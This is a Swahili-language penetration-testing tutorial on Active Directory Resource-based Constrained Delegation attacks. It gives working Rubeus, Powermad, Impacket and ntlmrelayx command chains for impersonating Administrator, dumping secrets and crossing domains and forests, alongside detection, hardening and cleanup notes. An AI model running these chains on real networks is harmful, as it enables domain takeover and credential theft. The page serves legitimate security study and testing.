# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Misingi ya Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) inafanana na [constrained delegation](constrained-delegation.md), lakini mwelekeo wa uaminifu umegeuzwa. Constrained delegation ya kawaida hurekodi huduma ambazo principal inaweza kuzikabidhi; RBCD hurekodi kwenye **target resource** principals ambazo zinaweza kujifanya watumiaji kwa ajili ya resource hiyo.<sup>[[12]](#references)</sup>

Sifa ya _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ ya object lengwa ina security descriptor inayobainisha principals wanaoruhusiwa kutenda kwa niaba ya identities nyingine kwenye resource hiyo.

Tofauti nyingine muhimu ni kwamba principal yenye **write permissions za kutosha kwenye machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty`, na haki zinazofanana) inaweza kuweka _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Kusanidi constrained delegation ya kawaida kwa kawaida huhitaji ufikiaji wa kiutawala wenye mamlaka zaidi.<sup>[[1]](#references)</sup>

Kwa usahihi zaidi, kubadilisha mipangilio ya classic constrained-delegation kwa kawaida kunadhibitiwa na `SeEnableDelegationPrivilege` kwenye domain controller, haki ambayo kwa kawaida huwa na wasimamizi wenye mamlaka ya juu. RBCD huhamisha uamuzi kwenye security descriptor ya target object, kwa hiyo write access kwenye property husika ya computer-object inaweza kutosha bila kuwa na haki hiyo ya mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Dhana Mpya

Flag ya **`TrustedToAuthForDelegation`** katika `userAccountControl` mara nyingi hufafanuliwa kama sharti la **S4U2Self**, lakini hilo si sahihi kikamilifu.\
Service principal yenye SPN inaweza kuomba S4U2Self bila flag hiyo. Ikiwa ina `TrustedToAuthForDelegation`, service ticket inayorejeshwa ni **forwardable**; ikiwa haina, ticket kwa kawaida **si forwardable**.<sup>[[5]](#references)</sup>

Constrained delegation ya kawaida hukataa **non-forwardable TGS** katika hatua ya S4U2Proxy. RBCD inaweza kukubali ticket hiyo ya S4U2Self ikiwa security descriptor ya target inaidhinisha huduma inayoomba.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Muundo wa shambulio

> Ikiwa una **write-equivalent privileges** kwenye **computer account**, unaweza kupata ufikiaji wenye mamlaka kwenye mashine hiyo.

Tuseme mshambuliaji tayari ana **write-equivalent privileges kwenye victim computer object**.

1. Mshambuliaji **huhatarisha** akaunti yenye **SPN** au **huunda moja** ("Service A"). Kwa chaguomsingi, mtumiaji wa domain aliye-authenticated anaweza kuunda hadi computer objects 10, kama inavyodhibitiwa na **_MachineAccountQuota_**; computer object hujipatia SPNs zinazoweza kutumika kiotomatiki.
2. Mshambuliaji **hutumia vibaya WRITE privilege yake** kwenye victim computer (ServiceB) kusanidi **resource-based constrained delegation ili kuruhusu ServiceA kujifanya mtumiaji yeyote** kwenye victim computer hiyo (ServiceB).
3. Mshambuliaji hutumia Rubeus kufanya **full S4U attack** (S4U2Self na S4U2Proxy) kutoka Service A hadi Service B kwa mtumiaji **mwenye ufikiaji wenye mamlaka kwenye Service B**.
   1. S4U2Self (kutoka akaunti ya SPN iliyohatarishwa au kuundwa): omba **TGS inayomwakilisha Administrator kwenda Service A** (non-forwardable).
   2. S4U2Proxy: tumia **non-forwardable TGS** hiyo kuomba service ticket inayomwakilisha **Administrator** kwenda kwa **victim host**.
   3. Ticket isiyo forwardable bado inaweza kufanya kazi katika mtiririko huu wa RBCD kwa sababu Service A imeidhinishwa kwenye security descriptor ya target resource.
4. Mshambuliaji anaweza **pass-the-ticket** na **kujifanya** mtumiaji huyo ili kupata **ufikiaji wa victim ServiceB**.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` hufunga njia ya chaguomsingi ya kuunda computer, lakini haiondoi write rights kwenye target computer object wala udhibiti wa akaunti iliyopo. Mtumiaji wa kawaida unayemdhibiti ambaye hana SPN wakati mwingine anaweza kutumika kama principal inayokabidhi kupitia [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd), ikiwemo ndani ya domain moja. Njia hiyo bado inahitaji RBCD write right inayotumika, udhibiti wa credentials za mtumiaji anayekabidhi, identity inayojifanya ambayo inaweza kukabidhiwa, tabia inayooana ya usimbaji fiche wa Kerberos, na mabadiliko ya NT-hash yanayovuruga akaunti. Chukulia haya kama masharti tofauti; sifa tupu ya RBCD au quota ya sifuri pekee havithibitishi mafanikio wala usalama.

RBCD descriptor iliyopo inaweza pia kutaja **group** badala ya computer inayokabidhi moja kwa moja. Ikiwa unadhibiti computer account yenye SPN na unaweza kuiongeza kwenye group hiyo, uanachama huo mpya unaweza kutoa njia ya delegation bila kubadilisha sifa ya RBCD ya target computer. Kagua ACL ya group inayodhibiti uandishi wa uanachama unaotumika (pamoja na deny ACEs), uanachama wa nested na token refresh, trustee SID ya descriptor, vizuizi vya delegation vya akaunti inayojifanya, na target service SPN kabla ya kuhitimisha kuwa njia hiyo inafanya kazi.

Kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Shambulio

### Kuunda Computer Object

Unaweza kuunda computer object ndani ya domain ukitumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Kusanidi Resource-based Constrained Delegation

**Kwa kutumia moduli ya Active Directory PowerShell**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Kutumia powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Kufanya shambulio kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliunda object mpya ya Computer kwa kutumia nenosiri `123456`, kwa hiyo tunahitaji hash ya nenosiri hilo:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Hii itachapisha hashes za RC4 na AES za akaunti hiyo.\
Sasa, shambulio linaweza kutekelezwa:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Unaweza kuzalisha tiketi zaidi kwa huduma zaidi kwa kuomba mara moja tu ukitumia param `/altservice` ya Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Watumiaji wanaweza kuwekwa alama ya **"Account is sensitive and cannot be delegated."** Ikiwa alama hiyo imewashwa, akaunti haiwezi kuigwa kupitia mtiririko huu wa delegation. BloodHound huonyesha sifa hii wakati wa uchanganuzi.

### Zana za Linux: RBCD kutoka mwanzo hadi mwisho kwa kutumia Impacket (2024+)

Ukitumia Linux, unaweza kutekeleza msururu mzima wa RBCD kwa kutumia zana rasmi za Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Vidokezo
- Ikiwa LDAP signing/LDAPS imetekelezwa, tumia `impacket-rbcd -use-ldaps ...`.
- Pendelea funguo za AES; domain nyingi za kisasa huzuia RC4. Impacket na Rubeus zote zinaunga mkono mtiririko wa AES pekee.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya tools, lakini pata SPN sahihi kila inapowezekana (k.m., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflective RBCD kwa delegator ya Kerberos-only isiyo na SPN

Mtumiaji aliyeathiriwa mwenye **`msDS-AllowedToDelegateTo` lakini asiye na SPN au `TrustedToAuthForDelegation`** hawezi kutoa tiketi ya ushahidi ya forwardable inayohitajika kwa [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) kwa kutumia S4U2Self ya kawaida.<sup>[[1]](#references)[[18]](#references)</sup> Ikiwa mtumiaji huyo anaweza kuandika RBCD kwenye object yake mwenyewe ya AD, akaunti yenye SPN inayodhibitiwa na mshambulizi inaweza kwanza kufanya delegation *kwa mtumiaji huyo*.<sup>[[1]](#references)[[18]](#references)</sup> Hatua hii ya RBCD hutoa tiketi ya forwardable ya mtumiaji anayeigwa kwa akaunti isiyo na SPN, ambayo inakuwa ushahidi wa S4U2Proxy ya pili kwa SPN iliyo kwenye allow-list ya classic delegation ya akaunti iliyoathiriwa.<sup>[[18]](#references)[[19]](#references)</sup>

Kwa hatua ya kwanza isiyo na SPN, ombi la S4U2Proxy la akaunti msaidizi lazima litumie **U2U**: `enc-tkt-in-skey` hufanya KDC isimbie tiketi kwa kutumia session key ya TGT ya delegator badala ya kutafuta ufunguo wa SPN.<sup>[[18]](#references)[[19]](#references)</sup> KDC pia inahitaji biti ya RBCD kwenye `PA-PAC-OPTIONS`, TGT ya delegator, na tiketi ya ushahidi ya S4U2Self.<sup>[[18]](#references)[[20]](#references)</sup> Fork ya `getST.py` ya Impacket ya mwandishi huongeza `-nospn` na `-tgt` kwa ombi hili; usaidizi wa `-nospn`/`-tgt` upo kwenye upstream Impacket PR #2324, kwa hiyo tumia fork iliyounganishwa badala ya kudhani kuwa `getST.py` ya kawaida inaunga mkono hatua hiyo.<sup>[[18]](#references)[[20]](#references)</sup>

Mfano huu unadhania kuwa `svc_web` imeathiriwa, inaweza kuandika attribute yake yenyewe ya RBCD, na inaruhusiwa kufanya delegation kwa `host/dc01.corp.local`. Pia unadhania kuwa akaunti msaidizi yenye SPN inaweza kuundwa, RC4 inaruhusiwa, na `Administrator` aliyechaguliwa anaweza kufanyiwa delegation. Omba **TGT ya RC4** kwa kutumia NT hash ya akaunti iliyoathiriwa. Endesha `getST.py` ya **kwanza** kutoka kwenye fork ya mwandishi; kagua matokeo ya `describeTicket.py` na utumie **session key ya TGT ya RC4** iliyoonyeshwa hapa chini. `getST.py` ya mwisho inaweza kuwa ya Impacket ya kawaida. Omba TGT **kabla** ya kubadilisha NT hash; mabadiliko haya huathiri service account hadi nenosiri lake lirekebishwe.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Tofauti na [njia ya RBCD isiyo na SPN iliyo hapa chini](#spn-less-cross-domain--cross-forest-rbcd), mnyororo huu hutumia akaunti isiyo na SPN kama **lengo la RBCD, kisha mjumbe wa kawaida wa KCD**. Bado unahitaji akaunti nyingine inayodhibitiwa yenye SPN. Ikiwa `MachineAccountQuota=0`, akaunti ya SPN ambayo tayari inadhibitiwa inaweza kuchukua nafasi ya kompyuta mpya; quota ya sifuri pekee haizuii njia hii.<sup>[[18]](#references)[[19]](#references)</sup>

## RBCD ya kati ya domain na kati ya forest

Ikiwa **principal anayekabidhi** unayemdhibiti yuko kwenye **domain tofauti** (au hata **forest tofauti**) na **kompyuta ya rasilimali**, matumizi mabaya bado ni **RBCD**, lakini mtiririko wa tiketi si ule wa kawaida wa domain moja wa `S4U2Self -> S4U2Proxy`.

### RBCD ya kati ya domain: sanidi principal wa nje kwa kutumia SID

Unapoweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kutoka kwa **domain tofauti**, huenda mashine/mtumiaji wa nje **asiweze kutatuliwa kwa jina** katika LDAP ya domain lengwa. Katika hali hiyo, sanidi ingizo la delegation kwa kutumia **SID** ya principal wa nje badala ya sAMAccountName/UPN yake.

Hili ni muhimu hasa unaporithi NTLM kwenda LDAP kwa `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes:
- `--sid` huiambia `ntlmrelayx.py` ichukulie `--escalate-user` kama SID, jambo linalohitajika wakati akaunti inayokabidhi ni ya nje ya domain lengwa.
- Hata kama tool itaonyesha `User not found in LDAP`, uandishi wa delegation bado unaweza kufanikiwa kwa sababu security descriptor huhifadhi SID ya nje moja kwa moja.

### RBCD ya vikoa tofauti: mfuatano wa S4U kati ya realms

Mara principal ya nje inapowekwa kwenye `msDS-AllowedToActOnBehalfOfOtherIdentity`, mtiririko unaofanya kazi kati ya vikoa ni:<sup>[[9]](#references)[[13]](#references)</sup>

1. Pata **TGT** ya principal inayokabidhi kutoka domain yake yenyewe.
2. Omba **referral TGT** ya `krbtgt/<target-domain>`.
3. Omba **cross-realm S4U2Self referral** ya mtumiaji anayeigizwa kwenye target-domain DC.
4. Omba tiketi halisi ya **S4U2Self** ya mtumiaji huyo, ukirudi kwenye domain ya delegator.
5. Fanya **S4U2Proxy** kwenye domain ya delegator ili kupata referral ticket ya target domain.
6. Fanya **S4U2Proxy** ya mwisho kwenye target-domain DC ili kupata service ticket ya `cifs/host.target`, `host/host.target`, n.k.

Hii ndiyo sababu tooling ya kawaida ya Linux mara nyingi hushindwa kwenye RBCD ya vikoa tofauti:<sup>[[9]](#references)</sup>
- **realm** ya ombi inaweza kuhitaji kuwa tofauti na realm ya TGT iliyotumiwa kwenye `TGS-REQ`
- mfuatano unahitaji hatua huru za **S4U2Proxy**, si **S4U2Self** pekee au **S4U2Self** ikifuatiwa mara moja na **S4U2Proxy** moja

### RBCD ya vikoa tofauti kutoka Linux

Synacktiv ilichapisha utekelezaji wa Impacket `getST.py` unaorudia mfuatano wa cross-realm kutoka Linux kwa kushughulikia KDC mbili moja kwa moja:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Kiutendaji, argumenti mpya ni:
- `-dc-ip`: DC ya domain **inayokasimu**
- `-targetdomain`: domain ya **kompyuta ya rasilimali**
- `-targetdc`: DC ya domain ya **rasilimali**

### Vikwazo vya RBCD kati ya misitu

RBCD kati ya misitu ina kikwazo muhimu: **mtumiaji anayeigizwa lazima awe wa forest sawa na principal inayokasimu**. Kwa maneno mengine, ikiwa akaunti ya mashine unayoidhibiti iko kwenye `valhalla.local` na rasilimali lengwa iko kwenye `asgard.local`, kwa kawaida **huwezi kuwaigiza watumiaji wowote wa `asgard.local` kwenye rasilimali hiyo kupitia RBCD**.<sup>[[9]](#references)</sup>

Bado inaweza kutumiwa vibaya wakati:
- mtumiaji wa **forest inayokasimu** ni **local admin** (au ana mapendeleo mengine) kwenye host ya rasilimali iliyo kwenye forest nyingine
- trust inaruhusu njia inayohitajika ya uthibitishaji na SID ya nje inakubaliwa kwenye security descriptor ya kompyuta lengwa

### Mambo ya kipekee ya protocol ya RBCD kati ya misitu

RBCD kati ya misitu si tu "cross-domain pamoja na trust". Mtiririko ulioonekana una mambo mawili ya kipekee ambayo zana za kawaida kihistoria hukosa:<sup>[[9]](#references)</sup>

1. Ombi la ziada la **S4U2Proxy** linaloweka **`PA-PAC-OPTIONS=branch-aware`**
2. Tiketi ya mwisho ya huduma ambayo inaweza kurejeshwa kwa kutumia **RC4** hata pale etypes nyingine zilipoombwa

Mtiririko wa kiutendaji ni:

1. Pata TGT ya principal inayokasimu katika forest A.
2. Omba **S4U2Self** kwa ajili ya mtumiaji anayeigizwa katika forest A.
3. Omba **S4U2Proxy** katika forest A ili kupata referral TGT ya forest B.
4. Tuma ombi la pili la **S4U2Proxy** katika forest A **bila** tiketi ya S4U2Self kama tiketi ya ziada, lakini ukiwasha `branch-aware`, ili kupata referral TGT nyingine ya forest B.
5. Kwa hiari, omba tiketi ya kawaida ya huduma katika forest B kwa ajili ya principal inayokasimu (tiketi hii haihitajiki kwa matumizi mabaya ya mwisho).
6. Tumia referral tickets kutoka hatua ya 3 na 4 kuomba tiketi ya mwisho ya **S4U2Proxy** katika forest B kwa mtumiaji anayeigizwa wa forest A, kuelekea SPN lengwa.

### RBCD kati ya misitu kutoka Linux

Branch ileile ya Synacktiv Impacket inaongeza switch ya `-forest` kwa mantiki hii:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### RBCD ya kujirudia katika domain nyingi (domain 3 au zaidi)

Katika **forest za domain nyingi**, **S4U2Self** na **S4U2Proxy** zinaweza kutekelezwa **kwa kujirudia** badala ya kusimama baada ya referral moja:

- **S4U2Self ya kujirudia**: `S4U2Self` ya kwanza hutumwa kwa **domain ya mtumiaji anayeigwa**, kisha hupitia hatua za kati za parent/child kwa kutumia referral za kawaida za `TGS-REQ` za `krbtgt/<REALM>`, na **S4U2Self ya mwisho** hutumwa katika **domain ya principal anaye-delegate**.
- Hii inamaanisha kuwa **kuwa tu na TGT** ya machine account kunaweza kutosha kuiga **admin kutoka domain nyingine katika forest hiyo hiyo** na kuomba `cifs/host`, `host/host`, `wsman/host`, n.k.
- **S4U2Proxy ya kujirudia** hufuata trust chain kwa njia hiyo hiyo: hatua za kati hutumia tena ticket iliyotangulia kama TGT huku zikiomba referral inayofuata ya `krbtgt/<REALM>`, na hatua ya mwisho pekee ndiyo hurejesha service ticket ya mwisho.<sup>[[10]](#references)</sup>

Mfano wa vitendo katika forest hiyo hiyo ni:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

Ikiwa **delegating principal ni user asiye na SPN**, `S4U2Self` ya mwisho katika mfululizo wa recursive hushindwa kwa **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Suluhisho ni **kujaribu tena hatua ya mwisho pekee kama `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo wa abuse:

1. Authenticate kwa kutumia **NT hash** ili kuelekeza KDC kutumia **RC4-HMAC (etype 23)**.
2. Omba **`-self -u2u`** kwanza na uitenge ticket hiyo na hatua ya proxy inayofuata.
3. Toa **TGT session key** kwa `describeTicket.py`.
4. Badilisha **NT hash** ya user iwe **session key** hiyo kwa kutumia `changepasswd.py -newhashes <session_key>`.
5. Tumia tena ticket ya **`S4U2Self+U2U`** kama **`-additional-ticket`** wakati wa ombi tofauti la **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Tahadhari za kiutendaji:

- Ikiwa **hop ya kwanza inayoaminika tayari iko kwenye forest nyingine**, pendelea algorithm ya **branch-aware** (`getST.py ... -forest`) ili ilingane na tabia asilia ya Windows. Ikiwa forest ya kigeni itafikiwa baadaye tu kwenye mnyororo, mtiririko wa recursive usio wa branch-aware unaweza bado kufanya kazi.<sup>[[9]](#references)</sup>
- Kwenye DC za hivi karibuni za **Windows Server 2022/2025**, kulazimisha RC4 kunaweza kushindwa kwa sababu ya kuondolewa kwa RC4, na kurudisha **`KDC_ERR_ETYPE_NOSUPP`**; hali hii inaweza kufanya **RBCD isiyotumia SPN isiwezekane**, ingawa RBCD ya kawaida inayotumia SPN bado hufanya kazi kwa AES.<sup>[[15]](#references)</sup>
- Endesha **`S4U2Self+U2U` kabla ya kubadilisha hash/nenosiri la mtumiaji**: **`SamrChangePasswordUser`** haihesabu upya funguo za Kerberos AES za akaunti, kwa hiyo kubadilisha nenosiri kwanza kunaweza kuharibu maombi ya tiketi yanayofuata.<sup>[[14]](#references)</sup>
- Akaunti inayoiga lazima bado iwe **inayoweza kukabidhiwa**: **Protected Users** na akaunti zilizo na **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** huzuia mnyororo.

## Vidokezo vya ugunduzi / uimarishaji

- Njia za RBCD zinazovuka domains/forests kwa kawaida bado huundwa kupitia **matumizi mabaya ya ACL** au **relay-to-LDAP**. Washa **LDAP signing** na **LDAP channel binding** kwenye DC ili kuvunja njia za kawaida za usanidi.
- Kagua ni nani anayeweza kuandika `msDS-AllowedToActOnBehalfOfOtherIdentity` kwenye computer objects, na utambue SIDs zilizohifadhiwa, ikiwemo **foreign security principals**.
- Katika mazingira yenye trust nyingi, kagua **Selective Authentication**, **SID filtering**, na kama watumiaji kutoka forest ya kigeni wana haki za **local admin** kwenye host za rasilimali.

### Kufikia

Mstari wa mwisho wa amri utafanya **shambulio kamili la S4U na kuingiza TGS** kutoka kwa Administrator kwenye host lengwa katika **memory**.\
Katika mfano huu, TGS ya huduma ya **CIFS** iliombwa kutoka kwa Administrator, kwa hiyo utaweza kufikia **C$**:

```bash
ls \\victim.domain.local\C$
```

### Tumia vibaya service tickets tofauti

Jifunze kuhusu [**service tickets zinazopatikana hapa**](silver-ticket.md#available-services).

## Kuhesabu, kukagua na kufanya usafi

### Hesabu kompyuta ambazo RBCD imesanidiwa

PowerShell (decoding SD ili kutatua SIDs):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (soma au futa kwa amri moja):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Usafishaji / kuweka upya RBCD

- PowerShell (futa attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kuwa Kerberos imesanidiwa kutotumia DES au RC4, nawe unatoa hash ya RC4 pekee. Mpe Rubeus angalau hash ya AES256 (au mpe hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** wakati wa `-self` kwa mtumiaji wa kawaida: huenda principal inayokabidhi haina **SPN**. Jaribu tena **hop ya mwisho** kama **`S4U2Self+U2U`** badala ya `S4U2Self` ya kawaida.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** wakati wa **SPN-less RBCD**: DC za hivi karibuni zinaweza kukataa njia ya **RC4-HMAC** inayolazimishwa na mbinu ya kubadilisha session-key ya `S4U2Self+U2U`. Jaribu njia ya kawaida ya **SPN-backed RBCD** ukitumia AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kuwa saa ya kompyuta ya sasa inatofautiana na ya DC, hivyo Kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kuwa username + hashes zilizotolewa hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya username wakati wa kutengeneza hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** wakati wa S4U2Proxy: Angalia vizuizi vya delegation vya akaunti inayoigizwa, alama ya forwardable ya evidence ticket, na kama KCD ya kawaida au descriptor ya RBCD ya lengwa inaruhusu hop hii. Hili ni **kosa la sera ya delegation la KDC**, si jaribio la kubaini kama huduma ya lengwa inaendeshwa au kama mtumiaji ana ruhusa ya kiwango cha programu. SPN ya lengwa ambayo haijasajiliwa kwa kawaida husababisha **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** badala yake.<sup>[[21]](#references)[[22]](#references)</sup>

## Vidokezo, relays na njia mbadala

- Unaweza pia kuandika RBCD SD kupitia AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Msururu wa Kerberos relay mara nyingi huishia kwenye RBCD ili kupata SYSTEM ya ndani kwa hatua moja. Tazama mifano ya vitendo ya mwanzo hadi mwisho:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ikiwa LDAP signing/channel binding **zimezimwa** na unaweza kuunda akaunti ya mashine, zana kama **KrbRelayUp** zinaweza ku-relay uthibitishaji wa Kerberos uliolazimishwa kwenda LDAP, kuweka `msDS-AllowedToActOnBehalfOfOtherIdentity` kwa akaunti yako ya mashine kwenye object ya kompyuta lengwa, na mara moja kuiga **Administrator** kupitia S4U kutoka nje ya host.<sup>[[8]](#references)</sup>

## References

- [1] [Kumtikisa Mbwa: Kutumia Vibaya Resource-Based Constrained Delegation Kushambulia Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
